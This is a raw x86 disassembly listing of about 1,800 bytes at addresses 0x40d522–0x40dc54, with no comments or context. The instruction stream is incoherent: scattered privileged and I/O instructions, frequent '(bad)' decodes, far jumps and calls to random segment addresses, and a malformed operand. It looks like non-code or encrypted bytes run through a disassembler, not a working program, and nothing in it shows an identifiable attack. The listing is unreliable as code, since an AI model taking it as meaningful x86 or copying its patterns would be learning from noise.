  40d522:	sub    DWORD PTR [ecx],esi
  40d524:	mov    al,ds:0xd31e3991
  40d529:	pop    es
  40d52a:	push   ebx
  40d52b:	inc    esp
  40d52c:	xchg   edx,eax
  40d52d:	ins    BYTE PTR es:[edi],dx
  40d52e:	stos   BYTE PTR es:[edi],al
  40d52f:	pop    esi
  40d530:	jge    0x40d54a
  40d532:	or     dl,BYTE PTR [ebp+eiz*4+0x17]
  40d536:	mov    al,0x28
  40d538:	or     DWORD PTR [ebx+0x19],ecx
  40d53b:	repz pop esi
  40d53d:	cdq    
  40d53e:	inc    ebx
  40d53f:	sbb    BYTE PTR [edi+eiz*1],0x58
  40d543:	sbb    cl,bh
  40d545:	aas    
  40d546:	out    dx,al
  40d547:	xchg   DWORD PTR [edx-0x20],esi
  40d54a:	in     al,0x75
  40d54c:	retf   0x8f5e
  40d54f:	ins    DWORD PTR es:[edi],dx
  40d550:	push   edx
  40d552:	ins    BYTE PTR es:[edi],dx
  40d553:	mov    ds:0xc57bdc9d,al
  40d558:	adc    ecx,DWORD PTR [esi]
  40d55a:	loope  0x40d56b
  40d55c:	pusha  
  40d55d:	cmp    esp,DWORD PTR [ebx+edi*8]
  40d560:	add    al,0xdb
  40d562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d563:	sti    
  40d564:	sbb    dh,0xd5
  40d567:	push   ecx
  40d568:	fadd   st(3),st
  40d56a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d56b:	adc    BYTE PTR [ecx+ebp*8-0x440d1e9c],dl
  40d572:	xlat   BYTE PTR ds:[ebx]
  40d573:	push   edi
  40d574:	or     edi,edi
  40d576:	aad    0x7
  40d578:	adc    al,0xc4
  40d57a:	mov    edx,ebx
  40d57c:	(bad)  
  40d57d:	pop    ds
  40d57e:	adc    al,0x94
  40d580:	inc    esp
  40d581:	pushf  
  40d582:	mov    dh,0xd1
  40d584:	inc    edx
  40d585:	dec    ecx
  40d586:	push   cs
  40d587:	push   ebp
  40d588:	in     al,0x4d
  40d58a:	push   esp
  40d58b:	cmp    eax,0xdfc2a44e
  40d590:	xlat   BYTE PTR ds:[ebx]
  40d591:	fcmovnb st,st(5)
  40d593:	fisttp WORD PTR [edx]
  40d595:	fist   DWORD PTR [eax]
  40d597:	jbe    0x40d534
  40d599:	into   
  40d59a:	push   es
  40d59b:	mov    eax,0x1cae4ade
  40d5a0:	(bad)  
  40d5a2:	stos   BYTE PTR es:[edi],al
  40d5a3:	jl     0x40d58b
  40d5a5:	sbb    al,0xf1
  40d5a7:	loop   0x40d556
  40d5a9:	leave  
  40d5aa:	loope  0x40d58f
  40d5ac:	inc    ebp
  40d5ad:	neg    BYTE PTR [edi-0x27]
  40d5b0:	adc    DWORD PTR [edx-0x43f982b0],ebx
  40d5b6:	fs cmp ah,bh
  40d5b9:	js     0x40d58d
  40d5bb:	adc    DWORD PTR [eax-0x1c],esp
  40d5be:	pop    eax
  40d5bf:	lods   al,BYTE PTR ds:[esi]
  40d5c0:	sbb    DWORD PTR [esi],0x19
  40d5c3:	xchg   edx,eax
  40d5c4:	shl    edi,cl
  40d5c6:	int3   
  40d5c7:	and    DWORD PTR [esi],eax
  40d5c9:	sahf   
  40d5ca:	popf   
  40d5cb:	push   ecx
  40d5cc:	xchg   ecx,eax
  40d5cd:	sbb    eax,0x79a2a8e2
  40d5d2:	add    ah,BYTE PTR ds:0xde6f17e1
  40d5d8:	dec    esi
  40d5d9:	jne    0x40d5b8
  40d5db:	sahf   
  40d5dc:	xor    eax,0x5b499afd
  40d5e1:	xor    BYTE PTR [edi+0x495841e0],bh
  40d5e7:	sub    DWORD PTR [ebx],edi
  40d5e9:	rol    ch,1
  40d5eb:	or     BYTE PTR [edi+0xd5a9b55],0x73
  40d5f2:	adc    al,0xeb
  40d5f4:	cs scas al,BYTE PTR es:[edi]
  40d5f6:	pop    eax
  40d5f7:	dec    esp
  40d5f8:	mov    ds:0x56ec1ca9,al
  40d5fd:	enter  0x947b,0x3e
  40d601:	retf   0x7a90
  40d604:	inc    esi
  40d605:	loop   0x40d60b
  40d607:	sub    DWORD PTR [esi+0x2acaeccc],ebp
  40d60d:	out    0xf0,eax
  40d60f:	xor    al,BYTE PTR [eax]
  40d611:	popa   
  40d612:	push   ss
  40d613:	pop    ss
  40d614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d615:	xor    eax,0x199fdf91
  40d61a:	fcmove st,st(6)
  40d61c:	jmp    0xe2eb7a6
  40d621:	jmp    0x87b2:0xdac7f4ba
  40d628:	loope  0x40d694
  40d62a:	pop    ss
  40d62b:	leave  
  40d62c:	add    DWORD PTR [edi+edx*8+0x3f],edx
  40d630:	and    edx,DWORD PTR [ecx+0xe]
  40d633:	add    cl,ch
  40d635:	jl     0x1bf17e5d
  40d63b:	and    al,0x55
  40d63d:	mov    ebx,0x2489bb8
  40d642:	adc    edi,edi
  40d644:	popa   
  40d645:	cmc    
  40d646:	call   0x422bde30
  40d64b:	jmp    0xf20bea3e
  40d650:	fs fucomip st,st(5)
  40d653:	arpl   WORD PTR ds:0xefc2cc05,bx
  40d659:	jne    0x40d68b
  40d65b:	aas    
  40d65c:	aas    
  40d65d:	and    cl,BYTE PTR [esi+0x25]
  40d660:	(bad)  
  40d661:	jmp    0x6a78:0xab707ee2
  40d668:	cmp    al,0x62
  40d66a:	in     al,dx
  40d66b:	ror    cl,cl
  40d66d:	fiadd  WORD PTR [edi]
  40d66f:	cli    
  40d670:	ret    
  40d671:	sbb    BYTE PTR [esi-0x1f],ah
  40d674:	not    DWORD PTR [edi-0x7f]
  40d677:	(bad)  
  40d678:	dec    BYTE PTR [esi+esi*1]
  40d67b:	xor    eax,edi
  40d67d:	add    eax,0x4e14388c
  40d682:	mov    edi,esi
  40d684:	in     eax,0x64
  40d686:	lahf   
  40d687:	iret   
  40d688:	imul   ecx,DWORD PTR [edx],0xc4517d93
  40d68e:	add    ebp,DWORD PTR [edx]
  40d690:	sbb    ecx,DWORD PTR [ebx-0x16ffdf4b]
  40d696:	mov    cl,0x1b
  40d698:	push   edi
  40d699:	div    BYTE PTR [ebx-0x5f]
  40d69c:	iret   
  40d69d:	dec    esp
  40d69e:	sub    al,0x1
  40d6a0:	jne    0x40d6e4
  40d6a2:	jo     0x40d6ea
  40d6a4:	icebp  
  40d6a5:	push   es
  40d6a6:	inc    edi
  40d6a7:	mov    edi,0x27ef66b3
  40d6ac:	xchg   edi,eax
  40d6ad:	or     eax,0xf71cce19
  40d6b2:	adc    cl,ch
  40d6b4:	mov    bh,0xa1
  40d6b6:	dec    ebx
  40d6b7:	lods   al,BYTE PTR ds:[esi]
  40d6b8:	test   ecx,ecx
  40d6ba:	(bad)  
  40d6bb:	jp     0x40d664
  40d6bd:	cmp    ecx,DWORD PTR [ebp-0x2510c539]
  40d6c3:	mov    bh,0xeb
  40d6c5:	cmp    eax,0x4883a03c
  40d6ca:	out    0x37,al
  40d6cc:	call   0xd699:0x4c725277
  40d6d3:	fstp   QWORD PTR [ecx+0x42]
  40d6d6:	push   edi
  40d6d7:	fld    QWORD PTR [edx+0x9]
  40d6da:	add    dl,BYTE PTR [ecx]
  40d6dc:	sbb    eax,ebp
  40d6de:	sub    eax,0x148221e5
  40d6e3:	stos   BYTE PTR es:[edi],al
  40d6e4:	and    BYTE PTR [ebp+ebp*2-0x55afe8db],dl
  40d6eb:	mov    al,BYTE PTR [esi+0x18a45425]
  40d6f1:	loop   0x40d74a
  40d6f3:	mov    esp,0xd2ff344
  40d6f8:	ins    DWORD PTR es:[edi],dx
  40d6f9:	add    BYTE PTR [edx-0x4756f655],0x28
  40d700:	popf   
  40d701:	sbb    BYTE PTR [eax],0x44
  40d704:	aaa    
  40d705:	test   al,0xbb
  40d707:	jae    0x40d6dd
  40d709:	dec    ebp
  40d70a:	stos   DWORD PTR es:[edi],eax
  40d70b:	(bad)  
  40d70c:	rcl    ah,cl
  40d70e:	fsubr  DWORD PTR ds:0x54c388e6
  40d714:	jno    0x40d75e
  40d716:	mov    BYTE PTR [ebp+0xc],cl
  40d719:	jno    0x40d6d6
  40d71b:	(bad)  
  40d71c:	imul   esi,DWORD PTR [edi],0xffffffb8
  40d71f:	mov    ebp,0xe45b7d12
  40d724:	sbb    eax,0xf51b645a
  40d729:	fsubp  st(6),st
  40d72b:	sub    eax,DWORD PTR [edx-0x66bf27ce]
  40d731:	jp     0x40d775
  40d733:	lods   al,BYTE PTR ds:[esi]
  40d734:	pop    eax
  40d735:	mov    dl,0xfd
  40d737:	mov    DWORD PTR [eax],edx
  40d739:	test   al,0x61
  40d73b:	dec    ecx
  40d73c:	jmp    0xa2a9:0x76378e8b
  40d743:	in     eax,0xc6
  40d745:	push   cs
  40d746:	sar    BYTE PTR [eax-0x47],1
  40d749:	sub    eax,0xad8d6cb7
  40d74e:	lods   eax,DWORD PTR ds:[esi]
  40d74f:	mov    esi,0xbe13e9c0
  40d754:	hlt    
  40d755:	pop    ss
  40d756:	xor    BYTE PTR [ecx+edx*2],0xd9
  40d75a:	push   0x1b
  40d75c:	psubq  mm0,QWORD PTR [eax]
  40d75f:	and    esp,DWORD PTR [ebp-0x222855fd]
  40d765:	dec    ecx
  40d766:	retf   0xd90e
  40d769:	push   ss
  40d76a:	sahf   
  40d76b:	popa   
  40d76c:	jecxz  0x40d6f1
  40d76e:	adc    dl,BYTE PTR [ecx+ebp*2-0x7eb07ab7]
  40d775:	es iret 
  40d777:	pop    ecx
  40d778:	jle    0x40d7ac
  40d77a:	push   ebx
  40d77b:	mov    gs,WORD PTR [ecx-0x80]
  40d77e:	jnp    0x40d7da
  40d780:	ss pop ss
  40d782:	xor    al,dh
  40d784:	pop    ds
  40d785:	das    
  40d786:	mov    eax,ds:0x2ba28929
  40d78b:	aad    0xfd
  40d78d:	shr    BYTE PTR [edx-0x56c9cc19],0x23
  40d794:	add    eax,0x6351b41a
  40d799:	mov    esp,DWORD PTR [ebp-0x65b8ac74]
  40d79f:	xlat   BYTE PTR ds:[ebx]
  40d7a0:	jns    0x40d78d
  40d7a2:	clc    
  40d7a3:	and    DWORD PTR [ecx-0x585ee378],edi
  40d7a9:	xchg   DWORD PTR [esi-0xd],esi
  40d7ac:	jno    0x40d78a
  40d7ae:	pop    ss
  40d7af:	(bad)
  40d7b3:	loope  0x40d826
  40d7b5:	fadd   DWORD PTR [ebp-0x2a381801]
  40d7bb:	mov    ebp,0xf917fbb8
  40d7c0:	ins    BYTE PTR es:[edi],dx
  40d7c1:	mov    ebx,DWORD PTR [esi+0x200e5ebb]
  40d7c7:	mov    ecx,0xed2c13ea
  40d7cc:	dec    esp
  40d7cd:	hlt    
  40d7ce:	add    DWORD PTR [edi+0x42],0x2ac93c98
  40d7d5:	test   BYTE PTR [eax],bl
  40d7d7:	mov    edx,0x1b45a9d6
  40d7dc:	test   eax,0x2d617a29
  40d7e1:	push   edi
  40d7e2:	lahf   
  40d7e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7e4:	fwait
  40d7e5:	xor    eax,0xa769b14e
  40d7ea:	dec    ebx
  40d7eb:	stc    
  40d7ec:	xchg   edx,eax
  40d7ed:	xor    DWORD PTR [ebx-0x230adb4d],esp
  40d7f3:	sub    ah,BYTE PTR [edx]
  40d7f5:	mov    esi,0xd4c08584
  40d7fa:	push   edi
  40d7fb:	fwait
  40d7fc:	adc    esi,DWORD PTR [ebp+0x401f972a]
  40d802:	inc    esi
  40d803:	dec    esp
  40d804:	or     DWORD PTR ds:0xda2cb835,esi
  40d80a:	sbb    BYTE PTR [ebp-0xa],al
  40d80d:	enter  0x26a8,0xb5
  40d811:	or     esp,esi
  40d813:	popf   
  40d814:	push   ecx
  40d815:	pop    eax
  40d816:	xchg   ecx,eax
  40d817:	cli    
  40d818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d819:	sahf   
  40d81a:	in     eax,0xf4
  40d81c:	mov    dh,0x42
  40d81e:	bound  edi,QWORD PTR [ebp+0x62]
  40d821:	std    
  40d822:	in     al,dx
  40d823:	dec    eax
  40d824:	xchg   ebp,eax
  40d825:	in     eax,dx
  40d826:	dec    esi
  40d827:	loop   0x40d7e1
  40d829:	mov    WORD PTR [eax+edx*4],fs
  40d82c:	cmp    edx,DWORD PTR [edx+0x1dbef0f3]
  40d832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d833:	pop    ebp
  40d834:	add    al,0xaa
  40d836:	pop    ss
  40d837:	push   esp
  40d838:	shl    DWORD PTR [edx+0x5b],0x7d
  40d83c:	cli    
  40d83d:	imul   ebp,DWORD PTR [ebx-0x798b43e5],0xffffff8c
  40d844:	aaa    
  40d845:	or     BYTE PTR [eax-0x3ae64169],0x38
  40d84c:	test   DWORD PTR [ecx+0x2e348d51],edx
  40d852:	sub    BYTE PTR [eax+edi*8+0x11b2d06e],ch
  40d859:	retf   
  40d85a:	adc    al,0xbc
  40d85c:	mov    cl,0xab
  40d85e:	aas    
  40d85f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d860:	pop    eax
  40d861:	and    al,0xdc
  40d863:	test   al,0x1c
  40d865:	adc    BYTE PTR [ebx],al
  40d867:	xor    DWORD PTR [eax-0x1f],0xd192112b
  40d86e:	aad    0x63
  40d870:	jmp    0xf1761511
  40d875:	cmc    
  40d876:	dec    esi
  40d877:	mov    ch,0x11
  40d879:	dec    ebp
  40d87a:	rol    BYTE PTR [esi],0x5e
  40d87d:	xchg   edx,eax
  40d87e:	aaa    
  40d87f:	sub    eax,0xd76d728b
  40d884:	fsubr  st(5),st
  40d886:	out    0x5c,eax
  40d888:	push   edi
  40d889:	adc    eax,DWORD PTR [edi]
  40d88b:	pop    esp
  40d88c:	add    DWORD PTR [ecx-0x27e04cad],ebp
  40d892:	jecxz  0x40d82a
  40d894:	fs jno 0x40d839
  40d897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d898:	inc    ecx
  40d899:	sahf   
  40d89a:	mov    ds:0x29e7d9c7,eax
  40d89f:	fs xchg ebp,eax
  40d8a1:	cmp    al,0xd5
  40d8a3:	sbb    dh,dl
  40d8a5:	ret    0x34ad
  40d8a8:	mov    bh,0xd0
  40d8aa:	jb     0x40d839
  40d8ac:	pop    ds
  40d8ad:	mov    bl,0x62
  40d8af:	fwait
  40d8b0:	repz sahf 
  40d8b2:	mov    DWORD PTR [eax-0x5d50e912],edx
  40d8b8:	jae    0x40d864
  40d8ba:	stos   BYTE PTR es:[edi],al
  40d8bb:	ror    BYTE PTR [eax+eiz*1-0x691dd023],cl
  40d8c2:	mov    edi,0x2b6e64d6
  40d8c7:	add    DWORD PTR [ecx-0x6ebb414a],esp
  40d8cd:	xor    eax,0x338b7ea
  40d8d2:	outs   dx,BYTE PTR ds:[esi]
  40d8d3:	mov    ds:0x990f5c49,eax
  40d8d8:	or     eax,0x1514ecc3
  40d8dd:	mov    ds:0xecf7663f,eax
  40d8e2:	fwait
  40d8e3:	mov    DWORD PTR [edi],ebx
  40d8e5:	cmc    
  40d8e6:	ins    DWORD PTR es:[edi],dx
  40d8e7:	pusha  
  40d8e8:	adc    dl,BYTE PTR [edx-0x26]
  40d8eb:	adc    BYTE PTR [edx+0x39],cl
  40d8ee:	test   al,0xf2
  40d8f0:	add    DWORD PTR [ecx+0x3f],0xffffff89
  40d8f4:	sub    eax,0x6184266f
  40d8f9:	ror    BYTE PTR [edi],0xa2
  40d8fc:	enter  0xb725,0x91
  40d900:	aas    
  40d901:	hlt    
  40d902:	outs   dx,DWORD PTR ds:[esi]
  40d903:	sbb    eax,0xdce6d17d
  40d908:	push   edi
  40d909:	lahf   
  40d90a:	in     al,0x30
  40d90c:	add    BYTE PTR [eax],ch
  40d90e:	sub    cl,cl
  40d910:	outs   dx,DWORD PTR ds:[esi]
  40d911:	xchg   edx,eax
  40d912:	ret    
  40d913:	shr    DWORD PTR [edx+0x39],cl
  40d916:	jg     0x40d951
  40d918:	jae    0x40d932
  40d91a:	xchg   esp,eax
  40d91b:	(bad)  
  40d91c:	dec    edi
  40d91d:	outs   dx,DWORD PTR ds:[esi]
  40d91e:	js     0x40d8cf
  40d920:	ror    BYTE PTR [ebx+0x36],cl
  40d923:	mov    esi,ecx
  40d925:	xor    al,0x32
  40d927:	(bad)  
  40d929:	push   esp
  40d92a:	fisubr DWORD PTR [edi+edi*8-0x30]
  40d92e:	push   0x42ed6ccd
  40d933:	push   esp
  40d934:	ins    BYTE PTR es:[edi],dx
  40d935:	pop    ebp
  40d936:	(bad)  ds:0x11e7c5bb
  40d93c:	aaa    
  40d93d:	shl    BYTE PTR [ebp+0x6bad5f88],cl
  40d943:	in     eax,dx
  40d944:	add    BYTE PTR [esi],ch
  40d946:	push   0x5957bca2
  40d94b:	mov    edi,0xee6ae840
  40d950:	push   cs
  40d951:	push   esp
  40d952:	mov    ch,0x9
  40d954:	fiadd  WORD PTR [ecx-0x43]
  40d957:	pushf  
  40d958:	test   BYTE PTR [ecx+0x500d636e],0xb8
  40d95f:	push   ds
  40d960:	call   0xc9c9:0x517faf53
  40d967:	pop    ds
  40d968:	jge    0x40d922
  40d96a:	push   0x794116fa
  40d96f:	adc    BYTE PTR [ecx+0x5e414bed],ch
  40d975:	stos   BYTE PTR es:[edi],al
  40d976:	in     al,0xf9
  40d978:	jo     0x40d9eb
  40d97a:	mov    ds:0x54da60f1,al
  40d97f:	and    al,0x39
  40d981:	mov    al,0x9
  40d983:	and    eax,0xdc617e37
  40d988:	pop    ss
  40d989:	sub    BYTE PTR ss:[esi-0x6f45e866],bl
  40d990:	popf   
  40d991:	cmc    
  40d992:	sar    eax,0x4e
  40d995:	jbe    0x40da0f
  40d997:	mov    bl,0x32
  40d999:	add    al,BYTE PTR [edx]
  40d99b:	test   DWORD PTR [ecx],0xfa42e8dd
  40d9a1:	mov    ch,0xad
  40d9a3:	fcos   
  40d9a5:	aad    0x48
  40d9a7:	ins    BYTE PTR es:[edi],dx
  40d9a8:	sbb    al,0xab
  40d9aa:	(bad)  
  40d9ab:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40d9ad:	sub    al,dh
  40d9af:	mov    ds:0xaeae0202,al
  40d9b4:	mov    cl,0xb
  40d9b6:	mov    ch,0x30
  40d9b8:	dec    ecx
  40d9b9:	xchg   edi,eax
  40d9ba:	leave  
  40d9bb:	adc    bh,BYTE PTR [ecx]
  40d9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9be:	in     eax,dx
  40d9bf:	rcr    ecx,1
  40d9c1:	adc    eax,0x77487382
  40d9c6:	out    dx,al
  40d9c7:	adc    dh,BYTE PTR [ebx-0x33]
  40d9ca:	ins    DWORD PTR es:[edi],dx
  40d9cb:	inc    ecx
  40d9cc:	nop
  40d9cd:	std    
  40d9ce:	rcl    BYTE PTR [ecx+0x25],cl
  40d9d1:	(bad)  
  40d9d2:	jb     0x40d9d0
  40d9d4:	call   0x959d4b84
  40d9d9:	les    esp,FWORD PTR ds:0xcf843b10
  40d9df:	rcr    bl,cl
  40d9e1:	xor    BYTE PTR ds:0x673e349,0x47
  40d9e8:	call   0xc98f284c
  40d9ed:	cmp    al,0x8c
  40d9ef:	inc    edx
  40d9f0:	loop   0x40d976
  40d9f2:	dec    ecx
  40d9f3:	pushf  
  40d9f4:	mov    ?,WORD PTR [ecx+0x55]
  40d9f7:	(bad)  
  40d9f8:	jg     0x40d9b7
  40d9fa:	hlt    
  40d9fb:	push   cs
  40d9fc:	sahf   
  40d9fd:	hlt    
  40d9fe:	lock aam 0x18
  40da01:	outs   dx,DWORD PTR ds:[esi]
  40da02:	xlat   BYTE PTR ds:[ebx]
  40da03:	les    ebp,FWORD PTR [edi+ecx*8]
  40da06:	std    
  40da07:	jae    0x40d9d6
  40da09:	call   0x887c:0xec91c90c
  40da10:	mov    ecx,0x417d5478
  40da15:	adc    dh,BYTE PTR [esi]
  40da17:	jecxz  0x40da24
  40da19:	stos   BYTE PTR es:[edi],al
  40da1a:	fcomp  st(6)
  40da1c:	mov    ebx,eax
  40da1e:	scas   eax,DWORD PTR es:[edi]
  40da1f:	mov    edx,0xb61f5a3b
  40da24:	ficomp WORD PTR [esi-0x5876e482]
  40da2a:	xor    al,0x4e
  40da2c:	jns    0x40da51
  40da2e:	push   edi
  40da2f:	pop    ebp
  40da30:	or     DWORD PTR [edi],eax
  40da32:	addr16 sub dh,bl
  40da35:	dec    edx
  40da36:	or     al,0x4
  40da38:	xlat   BYTE PTR ds:[ebx]
  40da39:	push   esp
  40da3a:	push   0xfffffffc
  40da3c:	loopne 0x40da70
  40da3e:	shl    DWORD PTR ss:[ebx+eax*4],0xd0
  40da43:	loopne 0x40d9ff
  40da45:	push   eax
  40da46:	jns    0x40da8f
  40da48:	inc    ebx
  40da49:	jae    0x40d9cc
  40da4b:	xchg   esi,eax
  40da4c:	pop    edx
  40da4d:	cmp    al,0x90
  40da4f:	mov    ebx,0x9eebd39f
  40da54:	cs mov ecx,gs
  40da57:	and    ah,cl
  40da59:	and    esi,eax
  40da5b:	(bad)  
  40da5c:	jmp    0x40d9e7
  40da5e:	jge    0x40daa1
  40da60:	push   ebx
  40da61:	pushf  
  40da62:	cmp    ebx,DWORD PTR [eax+0x3545abc8]
  40da68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da6a:	inc    ebx
  40da6b:	or     DWORD PTR [eax-0x13],0x7ad00356
  40da72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da73:	push   esp
  40da74:	push   edi
  40da75:	test   ecx,esi
  40da77:	or     edi,DWORD PTR ds:0x73163968
  40da7d:	mov    dh,0xa4
  40da7f:	aad    0xd1
  40da81:	dec    ecx
  40da82:	push   edi
  40da83:	xchg   ebp,eax
  40da84:	jno    0x40da4c
  40da86:	lods   eax,DWORD PTR ds:[esi]
  40da87:	inc    esp
  40da88:	cmp    DWORD PTR [ebx-0x27198da3],eax
  40da8e:	je     0x40da9c
  40da90:	dec    ecx
  40da91:	outs   dx,BYTE PTR ds:[esi]
  40da92:	out    dx,eax
  40da93:	jo     0x40db04
  40da95:	shl    BYTE PTR [ebx+0x584b07e0],0x7e
  40da9c:	sub    BYTE PTR [esp-0x65],ch
  40daa0:	cmp    ebx,DWORD PTR [ebx]
  40daa2:	lds    ecx,FWORD PTR [edx]
  40daa4:	outs   dx,DWORD PTR ds:[esi]
  40daa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daa6:	jl     0x40da7b
  40daa8:	(bad)  
  40daa9:	adc    DWORD PTR ds:0x54848e8d,eax
  40daaf:	out    dx,eax
  40dab0:	(bad)  
  40dab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dab3:	(bad)  
  40dab4:	mov    ah,0x3e
  40dab6:	jge    0x40dae0
  40dab8:	inc    ebx
  40dab9:	mov    eax,ds:0x5257321d
  40dabe:	dec    esp
  40dabf:	mov    eax,ds:0x3d6b3df8
  40dac4:	add    DWORD PTR [ebp*2+0x4fca77f9],eax
  40dacb:	fstp   TBYTE PTR [edi-0x6893f84e]
  40dad1:	adc    eax,0x5ec60d50
  40dad6:	adc    bl,dl
  40dad8:	loop   0x40dacf
  40dada:	lahf   
  40dadb:	mov    ch,0xcb
  40dadd:	inc    edi
  40dade:	leave  
  40dadf:	adc    edx,DWORD PTR [esi-0x6b9a7363]
  40dae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae6:	lods   al,BYTE PTR ds:[esi]
  40dae7:	daa    
  40dae8:	cld    
  40dae9:	mov    edx,0x23e9574d
  40daee:	(bad)  
  40daef:	pop    edi
  40daf0:	sbb    dl,BYTE PTR ds:0x785e6d5a
  40daf6:	mov    eax,ds:0xe1520c8a
  40dafb:	xor    dh,BYTE PTR [esi]
  40dafd:	adc    al,0x4e
  40daff:	or     bl,BYTE PTR [edx-0x78]
  40db02:	imul   eax,DWORD PTR [ecx],0x6f7af11a
  40db08:	sahf   
  40db09:	icebp  
  40db0a:	mov    edi,0x446ffbda
  40db0f:	dec    esi
  40db10:	adc    BYTE PTR [ebx],bl
  40db12:	arpl   WORD PTR [edx-0x7b],dx
  40db15:	push   es
  40db16:	mov    ebp,0xe521322
  40db1b:	retf   0xd69e
  40db1e:	je     0x40daa1
  40db20:	add    ebx,edx
  40db22:	push   ds
  40db23:	test   al,0x5d
  40db25:	mov    al,0x15
  40db27:	int    0xe
  40db29:	xor    DWORD PTR [edx+0x7d],ebx
  40db2c:	adc    al,0x73
  40db2e:	into   
  40db2f:	xor    al,0x83
  40db31:	jb     0x40dac8
  40db33:	and    eax,0x7673f36
  40db38:	lods   eax,DWORD PTR ds:[esi]
  40db39:	ins    DWORD PTR es:[edi],dx
  40db3a:	arpl   WORD PTR [esi-0x3f6164de],si
  40db40:	xchg   esi,eax
  40db41:	xor    ebp,ecx
  40db43:	retf   0x2960
  40db46:	arpl   si,dx
  40db48:	pop    ecx
  40db49:	lds    ebx,FWORD PTR [ebx]
  40db4b:	in     al,dx
  40db4c:	and    al,0x49
  40db4e:	lock outs dx,BYTE PTR ds:[esi]
  40db50:	and    eax,0x8c500a7
  40db55:	popa   
  40db56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db57:	xchg   edx,eax
  40db58:	cmp    ecx,DWORD PTR [ebp+0x7a]
  40db5b:	call   0x5371:0xfceec870
  40db62:	popf   
  40db63:	jle    0x40db0d
  40db65:	sbb    al,0x7a
  40db67:	ja     0x40db5a
  40db69:	pusha  
  40db6a:	int3   
  40db6b:	pushf  
  40db6c:	jl     0x40db25
  40db6e:	xchg   edi,eax
  40db6f:	pop    edx
  40db70:	mov    ah,0x58
  40db72:	ds call 0x3e50:0x13fc7e53
  40db7a:	mov    BYTE PTR [edx-0x3a47dce5],ah
  40db80:	push   0xe163c6c2
  40db85:	mov    DWORD PTR [ecx-0x76],esi
  40db88:	add    BYTE PTR [edi+esi*1+0x15143bf8],0xf9
  40db90:	xchg   ebx,eax
  40db91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db92:	or     esp,DWORD PTR [edi]
  40db94:	lock jbe 0x40db4d
  40db97:	in     al,0xd7
  40db99:	(bad)  
  40db9a:	(bad)  es:[ebx-0x5d]
  40db9e:	or     BYTE PTR [esi-0x26],cl
  40dba1:	push   0x5fc1760d
  40dba6:	mov    dh,0x41
  40dba8:	loopne 0x40db7c
  40dbaa:	shr    BYTE PTR [edi],0xf
  40dbad:	stc    
  40dbae:	dec    ebp
  40dbaf:	cmp    DWORD PTR [edx+0x5e],eax
  40dbb2:	xchg   esp,eax
  40dbb3:	mov    bl,0xaf
  40dbb5:	jl     0x40dc36
  40dbb7:	outs   dx,DWORD PTR ds:[esi]
  40dbb8:	mov    dl,0xa4
  40dbba:	or     al,0x7c
  40dbbc:	dec    ecx
  40dbbd:	sbb    DWORD PTR [eax+ecx*4],ebp
  40dbc0:	inc    ebx
  40dbc1:	mov    dh,0xce
  40dbc3:	test   DWORD PTR [edi],ebx
  40dbc5:	es loop 0x40db62
  40dbc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbc9:	mov    ch,0xe4
  40dbcb:	pop    esp
  40dbcc:	jl     0x40dc2b
  40dbce:	xor    bl,BYTE PTR [edi+0x3b]
  40dbd1:	or     DWORD PTR [ebp-0x5cb54fb2],esi
  40dbd7:	shl    BYTE PTR ds:0xa7c1fc88,1
  40dbdd:	jmp    0x40dba8
  40dbdf:	mov    ah,bl
  40dbe1:	mov    ds:0xf7159ce,al
  40dbe6:	push   0xffffffce
  40dbe8:	cmp    al,0x94
  40dbea:	inc    eax
  40dbeb:	and    al,0x76
  40dbed:	fadd   st(3),st
  40dbef:	adc    BYTE PTR [ecx],al
  40dbf1:	fist   DWORD PTR [edi-0x11]
  40dbf4:	stc    
  40dbf5:	and    al,0x80
  40dbf7:	pushf  
  40dbf8:	loop   0x40dbc8
  40dbfa:	je     0x40dc23
  40dbfc:	je     0x40dba7
  40dbfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbff:	mov    dl,0x5
  40dc01:	outs   dx,BYTE PTR ds:[esi]
  40dc02:	adc    dh,0x95
  40dc05:	xchg   edx,eax
  40dc06:	sbb    dl,BYTE PTR [edi]
  40dc08:	mov    al,0x40
  40dc0a:	dec    ebx
  40dc0b:	les    esi,FWORD PTR [edx]
  40dc0d:	add    DWORD PTR [esp+esi*1+0xbda0a76],eax
  40dc14:	lds    ebp,FWORD PTR [edx-0x5fbd1fcb]
  40dc1a:	add    BYTE PTR [edx+0x18],0xc
  40dc1e:	xor    eax,0x2dc30ca9
  40dc23:	mov    WORD PTR [esi-0x19a0ef95],es
  40dc29:	pop    es
  40dc2a:	sar    ebp,cl
  40dc2c:	in     eax,dx
  40dc2d:	ss clc 
  40dc2f:	inc    eax
  40dc30:	mov    cl,0x20
  40dc32:	call   0xf4ed:0x7b297b39
  40dc39:	adc    edi,ecx
  40dc3b:	xor    edi,DWORD PTR [edx]
  40dc3d:	(bad)  
  40dc3e:	scas   al,BYTE PTR es:[edi]
  40dc3f:	scas   eax,DWORD PTR es:[edi]
  40dc40:	mov    dl,0xb8
  40dc42:	dec    esi
  40dc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc44:	mov    eax,ds:0xbecb34a1
  40dc49:	or     esi,edx
  40dc4b:	fwait
  40dc4c:	(bad)  
  40dc4d:	dec    ecx
  40dc4e:	and    ch,BYTE PTR [esi+eax*1+0x2]
  40dc52:	mov    bh,0xa4
  40dc54:	or     al,0x4f
